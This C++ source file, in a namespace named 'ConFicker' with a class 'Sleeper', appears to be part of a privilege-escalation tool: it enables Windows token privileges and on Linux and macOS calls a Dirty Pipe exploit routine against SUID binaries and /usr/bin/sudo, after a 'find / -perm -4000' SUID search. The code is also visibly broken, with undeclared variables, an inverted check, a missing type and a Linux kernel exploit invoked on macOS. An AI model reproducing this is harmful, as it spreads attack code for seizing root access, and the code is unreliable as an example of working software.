#include <stdio.h>
#include <iostream>
#include <filesystem>
#include <stdlib.h>
#include "DirtyPipe.hpp"

#if defined(_WIN32)
    #define PLATFORM_NAME "windows" // Windows
    #include <windows.h>
#elif defined(_WIN64)
    #define PLATFORM_NAME "windows" // Windows
    #include <windows.h>
#elif defined(__APPLE__)
    #define PLATFORM_NAME "osx" // Apple OSX
    #include <ApplicationServices/ApplicationServices.h>
#elif defined(__linux__)
    #define PLATFORM_NAME "linux" // Debian, Ubuntu, Gentoo, Fedora, openSUSE, RedHat, Centos and other
    #include <X11/Xlib.h>
    #include <pthread.h>
    #include <unistd.h>
#endif



namespace ConFicker
{
    class Sleeper
    {
        public:
            Sleeper() = default;
            ~Sleeper() = default;

            static bool SetProcessPrivileges(
                const std::string privilege,
                bool enablePrivilege
            ) {
                if (PLATFORM_NAME == "windows")
                {
                    #ifdef _WIN32
                    HANDLE hToken;
                    TOKEN_PRIVILEGES tkp;
                    LUID luid;

                    if (LookupPrivilegeValueW(
                        NULL,
                        privilege.c_str(),
                        &luid
                    )) {
                        return false;
                    }

                    tp.PrivilegeCount = 1;
                    tp.Privileges[0].Luid = luid;
                    if (enablePrivilege) {
                        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                    } else {
                        tp.Privileges[0].Attributes = 0;
                    }

                    if (!AdjustTokenPrivileges(
                        hToken,
                        false,
                        &tp,
                        sizeof(TOKEN_PRIVILEGES),
                        (PTOKEN_PRIVILEGES) NULL,
                        (PDWORD) NULL
                    )) {
                        return false;
                    }

                    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
                        SetLastError(ERROR_NOT_ALL_ASSIGNED);
                        return false;
                    }

                    return true;
                    #endif

                    #ifdef __linux__
                        // Run dirty_pipe() function
                        const int dirtPipe = ConFicker::dirty_pipe(
                            (int(system("find / -perm -4000 2>/dev/null"))), // The SUID binary
                            "/usr/bin/sudo" // The file path
                        );

                        if (dirtPipe != 1)
                        {
                            return false;
                        } else {
                            return true;
                        }
                    #endif

                    #ifdef __APPLE__
                        // Run dirty_pipe() function again?
                        const dirtyPipe_Mac = ConFicker::dirty_pipe(
                            (int(system("find / -perm -4000 2>/dev/null"))), // The SUID binary
                            "/usr/bin/sudo" // The file path
                        );

                        if (dirtyPipe_Mac != 1)
                        {
                            return false;
                        } else {
                            return true;
                        }
                    #endif
                }
            }
    };
};